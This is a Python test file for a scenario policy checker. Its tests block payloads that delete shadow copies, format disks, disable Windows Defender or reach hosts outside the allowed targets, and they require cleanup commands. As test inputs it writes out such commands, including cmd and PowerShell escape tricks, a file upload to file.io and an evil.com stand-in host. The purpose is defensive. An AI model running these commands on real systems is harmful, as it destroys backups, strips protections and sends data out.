"""Forbidden actions and cleanups: an embedded payload never destroys, encrypts or removes a
protection for good, and every payload that changes the endpoint undoes it.

Characters are written by code point, never raw, so that this file holds none of them."""

from typing import Any

import pytest

from scenario_tools.domain.policy.actions import (
    as_command,
    forbidden_from_document,
    side_effects_from_document,
    statements,
)
from scenario_tools.domain.policy.registry import policy_findings, rule_findings
from scenario_tools.domain.policy.rule import PolicyData
from scenario_tools.domain.policy.rules.actions import RULE as FORBIDDEN_RULE
from scenario_tools.domain.policy.rules.cleanup import RULE as CLEANUP_RULE
from scenario_tools.domain.shared.finding import Finding, Severity
from tests.domain.policy.cases import (
    DATA,
    ENTRY,
    FORBIDDEN,
    PAYLOAD,
    SIDE_EFFECTS,
    content,
    with_payload,
)

JSON = f"{ENTRY}/scenario.json"
STEPS = "forbidden-actions: steps must be a list of 1 to 8 patterns"
CLEANUP_MESSAGE = (
    "this payload changes the endpoint (it writes, creates or starts something) but has no "
    "cleanup command with an executor: add one that undoes it"
)


def _found(findings: tuple[Finding, ...], code: str) -> list[str]:
    return [f.field for f in findings if f.code == code]


def test_the_rules_are_pol_004_and_pol_005_and_block() -> None:
    assert (FORBIDDEN_RULE.code, FORBIDDEN_RULE.severity) == ("POL-004", Severity.BLOCKING)
    assert (CLEANUP_RULE.code, CLEANUP_RULE.severity) == ("POL-005", Severity.BLOCKING)


@pytest.mark.parametrize(
    ("text", "read"),
    [
        ("VSSADMIN Delete Shadows", "vssadmin delete shadows"),
        ("v^ss^admin delete", "vssadmin delete"),  # cmd escapes
        ("vss`admin delete", "vssadmin delete"),  # PowerShell escapes
        ("vssadmin \"delete\" 'shadows'", "vssadmin delete shadows"),
        ("vssadmin\t  delete", "vssadmin delete"),
        ("vssadmin\n  delete", "vssadmin ; delete"),
        ("vss" + chr(0x200B) + "admin", "vssadmin"),  # an invisible character
        (chr(0xFF56) + "ssadmin", "vssadmin"),  # a compatibility form
        ('&("vssa"+"dmin") delete', "&(vssadmin) delete"),  # quoted pieces joined
        ("&('vssa' + 'dmin')", "&(vssadmin)"),
        ("a\nb\r\nc", "a ; b ; c"),  # each line a statement
        ('a "b;c&d|e" f', "a b c d e f"),  # separators inside quotes are blanks
        ("a 'b;c", "a b c"),  # an unclosed quote runs to the end
        ("a 2>&1 b", "a b"),  # a redirection is no separator
        ("a &>f", "a >f"),  # nor a redirection of both outputs to a file
        ("a &>>f", "a >>f"),
    ],
)
def test_a_command_is_read_as_a_shell_reads_it(text: str, read: str) -> None:
    assert as_command(text) == read


def test_the_lists_are_read() -> None:
    forbidden = forbidden_from_document(FORBIDDEN)

    assert [
        (
            [step.pattern for step in a.steps],
            a.why,
            [step.pattern for step in a.restore] if a.restore else None,
        )
        for a in forbidden
    ] == [(item["steps"], item["why"], item.get("restore")) for item in FORBIDDEN["actions"]]
    assert [
        [step.pattern for step in steps] for steps in side_effects_from_document(SIDE_EFFECTS)
    ] == SIDE_EFFECTS["commands"]


@pytest.mark.parametrize(
    ("read", "parts"),
    [
        ("a ; b", ["a", "b"]),
        ("a && b || c & d", ["a", "b", "c", "d"]),
        ("gci x | select y", ["gci x | select y"]),  # a pipeline is one statement
        ("; a ;", ["a"]),
    ],
)
def test_a_command_is_cut_into_statements(read: str, parts: list[str]) -> None:
    assert statements(read) == parts


@pytest.mark.parametrize(
    ("document", "message"),
    [
        ([], "forbidden-actions: the document must be a mapping holding actions"),
        ({"actions": "x"}, "forbidden-actions: the document must be a mapping holding actions"),
        ({"actions": [], "x": 1}, "forbidden-actions: unknown keys x"),
        ({"actions": [], "b": 1, "a": 2}, "forbidden-actions: unknown keys a, b"),
        (
            {"actions": [{"steps": ["a"], "why": "b", "y": 1, "x": 2}]},
            "forbidden-actions: unknown keys x, y",
        ),
        ({"actions": ["x"]}, "forbidden-actions: an action must be a mapping"),
        ({"actions": [{"steps": ["a"], "why": "b", "x": 1}]}, "forbidden-actions: unknown keys x"),
        (
            {"actions": [{"steps": ["a"], "why": "b", "protection": True}]},
            "forbidden-actions: unknown keys protection",
        ),
        ({"actions": [{"steps": [1], "why": "b"}]}, "forbidden-actions: a pattern must be a text"),
        ({"actions": [{"steps": ["("], "why": "b"}]}, "forbidden-actions: a pattern must compile"),
        ({"actions": [{"steps": "a", "why": "b"}]}, STEPS),
        ({"actions": [{"steps": [], "why": "b"}]}, STEPS),
        ({"actions": [{"steps": ["a"] * 9, "why": "b"}]}, STEPS),
        ({"actions": [{"steps": ["a"], "why": ""}]}, "forbidden-actions: why must be a short text"),
        (
            {"actions": [{"steps": ["a"], "why": "b" * 121}]},
            "forbidden-actions: why must be a short text",
        ),
        ({"actions": [{"steps": ["a"], "why": 1}]}, "forbidden-actions: why must be a short text"),
        (
            {"actions": [{"steps": ["a"], "why": "b", "restore": [1]}]},
            "forbidden-actions: a pattern must be a text",
        ),
        (
            {"actions": [{"steps": ["a"], "why": "b", "restore": ["("]}]},
            "forbidden-actions: a pattern must compile",
        ),
        (
            {"actions": [{"steps": ["a"], "why": "b"}, {"steps": ["a"], "why": "c"}]},
            "forbidden-actions: each action once",
        ),
    ],
)
def test_a_malformed_list_of_forbidden_actions_is_refused(document: object, message: str) -> None:
    with pytest.raises(ValueError, match=f"^{message}$"):
        forbidden_from_document(document)


@pytest.mark.parametrize(
    ("document", "message"),
    [
        ([], "side-effects: the document must be a mapping holding commands"),
        ({"commands": "x"}, "side-effects: the document must be a mapping holding commands"),
        ({"commands": [], "x": 1}, "side-effects: unknown keys x"),
        ({"commands": [[1]]}, "side-effects: a pattern must be a text"),
        ({"commands": [["("]]}, "side-effects: a pattern must compile"),
        ({"commands": ["a"]}, "side-effects: steps must be a list of 1 to 8 patterns"),
        ({"commands": [["a"], ["a"]]}, "side-effects: each action once"),
    ],
)
def test_a_malformed_list_of_side_effects_is_refused(document: object, message: str) -> None:
    with pytest.raises(ValueError, match=f"^{message}$"):
        side_effects_from_document(document)


@pytest.mark.parametrize(
    ("payload", "field", "why"),
    [
        (
            {"command_content": "vssadmin delete shadows"},
            "/command_content",
            "deletes shadow copies",
        ),
        (
            {"command_content": "v^ssadmin delete shadows"},
            "/command_content",
            "deletes shadow copies",
        ),
        ({"payload_cleanup_command": "format c:"}, "/payload_cleanup_command", "formats a disk"),
        (
            {"payload_arguments": [{"key": "x", "default_value": "vssadmin delete"}]},
            "/payload_arguments/0/default_value",
            "deletes shadow copies",
        ),
        (
            {"payload_prerequisites": [{"get_command": "x", "check_command": "format d:"}]},
            "/payload_prerequisites/0/check_command",
            "formats a disk",
        ),
        (
            {"payload_prerequisites": [{"get_command": "vssadmin delete"}]},
            "/payload_prerequisites/0/get_command",
            "deletes shadow copies",
        ),
        (
            {"command_content": "Set-MpPreference -DisableRealtimeMonitoring $true"},
            "/command_content",
            "turns off an antivirus protection",
        ),
    ],
)
def test_a_forbidden_action_is_refused(payload: dict[str, Any], field: str, why: str) -> None:
    findings = policy_findings(DATA, with_payload(**payload))

    (finding,) = (f for f in findings if f.code == "POL-004")
    assert (finding.severity, finding.path, finding.field, finding.message) == (
        Severity.BLOCKING,
        JSON,
        PAYLOAD + field,
        f"this command {why}, which a shared scenario never does: remove it",
    )


def test_removing_a_protection_is_allowed_when_the_cleanup_restores_it() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring $true",
        payload_cleanup_command="Set-MpPreference -DisableRealtimeMonitoring $false",
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == []


@pytest.mark.parametrize(
    ("cleanup", "executor"),
    [
        ("echo done", "psh"),  # a cleanup that restores nothing
        ("Set-MpPreference -DisableRealtimeMonitoring $false", None),  # never runs
        ("Set-MpPreference -DisableRealtimeMonitoring $false", ""),
    ],
)
def test_removing_a_protection_needs_a_cleanup_that_restores_it(
    cleanup: str, executor: object
) -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring $true",
        payload_cleanup_command=cleanup,
        payload_cleanup_executor=executor,
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_a_cleanup_that_removes_a_protection_is_never_exempt() -> None:
    payload = with_payload(
        command_content="whoami",
        payload_cleanup_command=(
            "Set-MpPreference -DisableRealtimeMonitoring $false; "
            "Set-MpPreference -DisableIOAVProtection $true"
        ),
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [
        PAYLOAD + "/payload_cleanup_command"
    ]


def test_a_command_too_long_to_check_is_refused() -> None:
    findings = policy_findings(DATA, with_payload(command_content="a" * 65_537))

    (finding,) = (f for f in findings if f.code == "POL-004")
    assert (finding.field, finding.message) == (
        PAYLOAD + "/command_content",
        "this command is longer than 65536 characters, its arguments given, too long to check: "
        "shorten it",
    )


def test_a_command_at_the_bound_is_checked() -> None:
    assert (
        _found(policy_findings(DATA, with_payload(command_content="a" * 65_536)), "POL-004") == []
    )


def test_the_values_an_inject_gives_to_the_payload_s_arguments_are_read() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_content": {"x": "vssadmin delete shadows", "other": "vssadmin delete"},
                "inject_injector_contract": {
                    "injector_contract_payload": {
                        "command_content": "#{x}",
                        "payload_arguments": [{"key": "x", "default_value": "1"}, "y", {"key": 1}],
                    }
                },
            }
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-004") == [
        PAYLOAD + "/command_content",  # "#{x}" runs what the inject gives
        "/scenario_injects/0/inject_content/x",
    ]


@pytest.mark.parametrize("given", [{"x": ""}, {"x ": "vssadmin list"}, {"X": "vssadmin list"}])
def test_the_default_runs_when_the_inject_gives_no_value_by_that_exact_name(
    given: dict[str, str],
) -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_content": given,
                "inject_injector_contract": {
                    "injector_contract_payload": {
                        "command_content": "#{x}",
                        "payload_arguments": [{"key": "x", "default_value": "vssadmin delete"}],
                    }
                },
            }
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-004") == [
        PAYLOAD + "/command_content",
        PAYLOAD + "/payload_arguments/0/default_value",
    ]


def test_arguments_that_expand_past_the_bound_are_too_long_to_check() -> None:
    payload = with_payload(
        command_content="#{x}" * 20,
        payload_arguments=[{"key": "x", "default_value": "a" * 4_000}],
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_a_cleanup_that_expands_past_the_bound_restores_nothing() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring:$true",
        payload_cleanup_command="Set-MpPreference -DisableRealtimeMonitoring:$false #{x}"
        + "#{x}" * 20,
        payload_cleanup_executor="psh",
        payload_arguments=[{"key": "x", "default_value": "a" * 4_000}],
    )

    assert PAYLOAD + "/command_content" in _found(policy_findings(DATA, payload), "POL-004")


@pytest.mark.parametrize(
    "command",
    [
        "vssadmin 2>&1 delete shadows",  # a redirection is no separator
        "vssadmin >nul 2>&1 delete shadows",
        "vssadmin &>/dev/null delete shadows",
        "vssadmin ^\ndelete shadows",  # line continuations
        "vssadmin \\\ndelete shadows",
        "vssadmin `\ndelete shadows",
        'Set-MpPreference -SignatureFallbackOrder "x;y" -DisableRealtimeMonitoring $true',
        'vssadmin "a&b" delete shadows',  # a separator inside quotes
    ],
)
def test_a_statement_is_never_cut_where_the_shell_does_not_cut_it(command: str) -> None:
    findings = policy_findings(DATA, with_payload(command_content=command))

    assert _found(findings, "POL-004") == [PAYLOAD + "/command_content"]


@pytest.mark.parametrize(
    "command",
    ["curl https://www.example.com | grep -o x", "type x | sed -n 1p", "dir >> /dev/null"],
)
def test_a_command_piped_after_a_read_is_judged_on_its_own(command: str) -> None:
    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-005") == []


@pytest.mark.parametrize(
    "command",
    [
        "Get-Process | Format-Table",
        "vssadmin list shadows",
        "Remove-Item -Path C:\\windows\\temp\\x -Recurse -Force",
        "whoami; net.exe group /DOMAIN",
    ],
)
def test_harmless_commands_pass(command: str) -> None:
    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-004") == []


@pytest.mark.parametrize(
    "payload",
    [
        {"command_content": "copy a b"},
        {"command_content": "sc.exe create Crowdoor binPath= x"},
        {"command_content": "echo test > c:\\x.txt"},
        {"command_content": "whoami", "payload_prerequisites": [{"get_command": "New-Item x"}]},
        {"command_content": "copy a b", "payload_cleanup_command": ""},
        {"command_content": "copy a b", "payload_cleanup_command": "  "},
        {"command_content": "co^py a b"},
        {"command_content": "whoami &>out.log"},
        {"command_content": "copy a b", "payload_cleanup_command": "del b"},  # no executor
        {"command_content": "x", "payload_arguments": [{"key": "a", "default_value": "copy a b"}]},
        {"command_content": "x", "payload_prerequisites": [{"check_command": "New-Item x"}]},
        {"payload_type": "Executable"},  # running a file always changes the endpoint
        {"payload_type": "FileDrop"},
    ],
)
def test_a_payload_that_changes_the_endpoint_without_cleanup_is_refused(
    payload: dict[str, Any],
) -> None:
    findings = policy_findings(DATA, with_payload(**payload))

    (finding,) = (f for f in findings if f.code == "POL-005")
    assert (finding.severity, finding.path, finding.field, finding.message) == (
        Severity.BLOCKING,
        JSON,
        PAYLOAD + "/payload_cleanup_command",
        CLEANUP_MESSAGE,
    )


@pytest.mark.parametrize(
    "payload",
    [
        {
            "command_content": "copy a b",
            "payload_cleanup_command": "del b",
            "payload_cleanup_executor": "cmd",
        },
        {
            "payload_type": "Executable",
            "payload_cleanup_command": "del x",
            "payload_cleanup_executor": "cmd",
        },
        {"command_content": "whoami"},
        {"command_content": "dir C:\\ 2>$null"},
        {"command_content": "gci x | select FullName"},
        {"payload_type": "Command", "command_content": "whoami"},
        {"command_content": "Remove-Item x -Force"},
        {},
    ],
)
def test_a_payload_that_reads_or_cleans_up_passes(payload: dict[str, Any]) -> None:
    assert _found(policy_findings(DATA, with_payload(**payload)), "POL-005") == []


def test_each_payload_is_judged_on_its_own() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {"command_content": "whoami"}
                }
            },
            {"inject_injector_contract": None},
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {"command_content": "copy a b"}
                }
            },
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-005") == [
        "/scenario_injects/2/inject_injector_contract/injector_contract_payload"
        "/payload_cleanup_command"
    ]


@pytest.mark.parametrize(
    "stored",
    [
        None,
        {"scenario_injects": None},
        {"scenario_injects": ["x", {"inject_injector_contract": "x"}]},
        {"scenario_injects": [{"inject_injector_contract": {"injector_contract_payload": "x"}}]},
        {
            "scenario_injects": [
                {
                    "inject_injector_contract": {
                        "injector_contract_payload": {
                            "command_content": 5,
                            "payload_arguments": ["x", {"default_value": None}],
                            "payload_prerequisites": "x",
                        }
                    }
                }
            ]
        },
        {
            "scenario_injects": [
                {
                    "inject_injector_contract": {
                        "injector_contract_payload": {
                            "payload_prerequisites": ["x", {"get_command": None}],
                        }
                    }
                }
            ]
        },
    ],
)
def test_a_stored_scenario_not_shaped_like_one_is_left_to_its_own_check(stored: object) -> None:
    findings = policy_findings(DATA, content(stored=stored))

    assert [f for f in findings if f.code in ("POL-004", "POL-005")] == []


@pytest.mark.parametrize(
    ("payload", "field"),
    [
        ({"command_content": "curl -F file=@x https://file.io/"}, "/command_content"),
        (
            {"payload_prerequisites": [{"get_command": "Invoke-WebRequest https://curl.se/x"}]},
            "/payload_prerequisites/0/get_command",
        ),
        (
            {"payload_arguments": [{"key": "h", "default_value": "10.0.0.5"}]},
            "/payload_arguments/0/default_value",
        ),
        ({"payload_cleanup_command": "ping 8.8.8.8"}, "/payload_cleanup_command"),
    ],
)
def test_a_payload_naming_a_host_outside_the_allowed_targets_is_refused(
    payload: dict[str, Any], field: str
) -> None:
    findings = policy_findings(DATA, with_payload(**payload))

    assert _found(findings, "POL-003") == [PAYLOAD + field]


def test_one_rule_alone_reads_its_lists() -> None:
    failing = with_payload(command_content="vssadmin delete")

    assert [f.code for f in rule_findings("POL-004", DATA, failing)] == ["POL-004"]
    assert rule_findings("POL-005", DATA, failing) == ()


def test_a_reason_of_120_characters_is_short_enough() -> None:
    (action,) = forbidden_from_document({"actions": [{"steps": ["a"], "why": "b" * 120}]})

    assert action.why == "b" * 120


def test_every_field_and_every_action_of_a_payload_is_judged() -> None:
    payload = with_payload(
        command_content="a" * 65_537,
        payload_cleanup_command="format c:",
        payload_arguments=["y", {"key": "x", "default_value": "vssadmin delete"}],
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [
        PAYLOAD + "/command_content",
        PAYLOAD + "/payload_cleanup_command",
        PAYLOAD + "/payload_arguments/1/default_value",
    ]


def test_an_exempt_protection_does_not_hide_a_later_action_in_the_same_command() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring $true ; format c:",
        payload_cleanup_command="Set-MpPreference -DisableRealtimeMonitoring $false",
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_every_payload_is_read_whatever_comes_before_it() -> None:
    stored = {
        "scenario_injects": [
            "x",
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {
                        "command_content": "copy a b",
                        "payload_cleanup_command": "del b",
                        "payload_cleanup_executor": "cmd",
                    }
                }
            },
            {
                "inject_injector_contract": {
                    "injector_contract_payload": {"command_content": "copy a b"}
                }
            },
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-005") == [
        "/scenario_injects/2/inject_injector_contract/injector_contract_payload"
        "/payload_cleanup_command"
    ]


def test_an_argument_the_inject_gives_is_reported_at_its_escaped_key() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_content": {"a~b/c": "vssadmin delete"},
                "inject_injector_contract": {
                    "injector_contract_payload": {"payload_arguments": [{"key": "a~b/c"}]}
                },
            }
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-004") == [
        "/scenario_injects/0/inject_content/a~0b~1c"
    ]


def test_padding_between_the_steps_of_an_action_hides_nothing() -> None:
    command = "vssadmin " + "-x " * 5_000 + "delete shadows"

    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-004") == [
        PAYLOAD + "/command_content"
    ]


def test_the_steps_of_an_action_are_found_in_one_statement() -> None:
    command = "vssadmin list shadows\nsc.exe delete x"

    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-004") == []


@pytest.mark.parametrize(
    "cleanup",
    [
        "echo Set-MpPreference -DisableRealtimeMonitoring $false",  # said, never done
        "Write-Output x; echo set-mppreference -disablex $false",
    ],
)
def test_a_cleanup_that_only_mentions_the_restore_does_not_restore(cleanup: str) -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring:$true",
        payload_cleanup_command=cleanup,
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_a_restore_after_another_statement_restores() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring:$true",
        payload_cleanup_command=(
            "Write-Output x; Set-MpPreference -DisableRealtimeMonitoring:$false"
        ),
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == []


def test_a_command_is_judged_with_the_values_of_its_arguments() -> None:
    payload = with_payload(
        command_content="curl #{opts} https://www.example.com",
        payload_arguments=[{"key": "opts", "default_value": "-o artifact.bin"}],
    )

    assert _found(policy_findings(DATA, payload), "POL-005") == [
        PAYLOAD + "/payload_cleanup_command"
    ]


def test_the_value_an_inject_gives_replaces_the_default() -> None:
    stored = {
        "scenario_injects": [
            {
                "inject_content": {"x": "vssadmin list shadows"},
                "inject_injector_contract": {
                    "injector_contract_payload": {
                        "command_content": "#{x}",
                        "payload_arguments": [{"key": "x", "default_value": "vssadmin delete"}],
                    }
                },
            }
        ]
    }

    assert _found(policy_findings(DATA, content(stored=stored)), "POL-004") == []


def test_an_argument_the_payload_does_not_name_stays_as_written() -> None:
    payload = with_payload(command_content="vssadmin #{missing} delete")

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_an_argument_with_no_value_is_skipped_and_the_next_is_read() -> None:
    payload = with_payload(
        payload_arguments=[{"key": "x"}, {"key": "y", "default_value": "vssadmin delete"}]
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [
        PAYLOAD + "/payload_arguments/1/default_value"
    ]


def test_steps_are_found_in_their_order() -> None:
    command = "echo delete then vssadmin list"

    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-004") == []


def test_an_action_is_found_anywhere_in_its_statement() -> None:
    command = "cmd /c vssadmin delete shadows"

    assert _found(policy_findings(DATA, with_payload(command_content=command)), "POL-004") == [
        PAYLOAD + "/command_content"
    ]


def test_eight_steps_are_allowed() -> None:
    (action,) = forbidden_from_document({"actions": [{"steps": ["a"] * 8, "why": "b"}]})

    assert len(action.steps) == 8


def test_arguments_that_expand_exactly_to_the_bound_are_checked() -> None:
    payload = with_payload(
        command_content="#{x}", payload_arguments=[{"key": "x", "default_value": "a" * 65_536}]
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == []


def test_each_argument_is_replaced_once_where_it_stands() -> None:
    payload = with_payload(
        command_content="a" * 40_000 + "#{x}#{y}",
        payload_arguments=[{"key": "x", "default_value": ""}, {"key": "y", "default_value": ""}],
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == []


def test_an_unknown_argument_never_becomes_the_restore() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring:$true",
        payload_cleanup_command="#{set-mppreference} -DisableRealtimeMonitoring:$false",
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_a_cleanup_that_starts_like_the_restore_but_restores_nothing_does_not_restore() -> None:
    payload = with_payload(
        command_content="Set-MpPreference -DisableRealtimeMonitoring:$true",
        payload_cleanup_command="Set-MpPreference -SignatureUpdateInterval 1",
        payload_cleanup_executor="psh",
    )

    assert _found(policy_findings(DATA, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_the_steps_of_a_restore_are_found_after_its_first_one() -> None:
    forbidden = forbidden_from_document(
        {
            "actions": [
                {"steps": [r"\bdisable\b"], "why": "turns x off", "restore": ["enable ab", "ab"]}
            ]
        }
    )
    data = PolicyData(DATA.targets, forbidden, DATA.side_effects)
    payload = with_payload(
        command_content="disable",
        payload_cleanup_command="enable ab",  # "ab" only inside the first step
        payload_cleanup_executor="sh",
    )

    assert _found(policy_findings(data, payload), "POL-004") == [PAYLOAD + "/command_content"]


def test_a_host_an_argument_brings_into_the_command_is_refused() -> None:
    payload = with_payload(
        command_content="curl http://#{target}/x",
        payload_arguments=[{"key": "target", "default_value": "user@evil.com"}],
    )

    assert _found(policy_findings(DATA, payload), "POL-003") == [PAYLOAD + "/command_content"]
